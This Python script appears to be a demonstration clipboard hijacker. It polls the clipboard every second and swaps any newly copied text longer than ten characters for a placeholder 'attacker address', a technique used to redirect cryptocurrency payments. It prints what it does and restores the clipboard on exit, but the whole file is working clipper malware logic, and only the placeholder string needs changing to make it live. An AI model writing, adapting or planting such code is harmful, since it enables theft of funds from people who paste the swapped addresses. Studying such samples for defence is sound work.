import pyperclip
import time

ATTACKER_ADDRESS = "HACKER123456789XYZ"

def monitor_clipboard():
    print("Monitoring clipboard... (Press Ctrl+C to stop)\n")

    last_value = ""
    original_value = None
    replaced_value = None

    try:
        while True:
            current = pyperclip.paste()

            # Detect new copied content (avoid replacing already hacked value)
            if current != last_value and current != ATTACKER_ADDRESS and len(current) > 10:
                print("Copied:", current)

                # Save original value
                original_value = current

                # Replace clipboard with attacker address
                pyperclip.copy(ATTACKER_ADDRESS)
                replaced_value = ATTACKER_ADDRESS

                print("⚠️ Address replaced with attacker address!\n")

                last_value = current

            time.sleep(1)

    except KeyboardInterrupt:
        print("\n🛑 Stopping clipboard monitor...")

        # Restore original clipboard value
        if original_value:
            pyperclip.copy(original_value)
            print("Clipboard restored to original value.")

        # Show last replaced value
        if replaced_value:
            print("Last replaced address:", replaced_value)

        print("Exited cleanly. ✅")


if __name__ == "__main__":
    monitor_clipboard()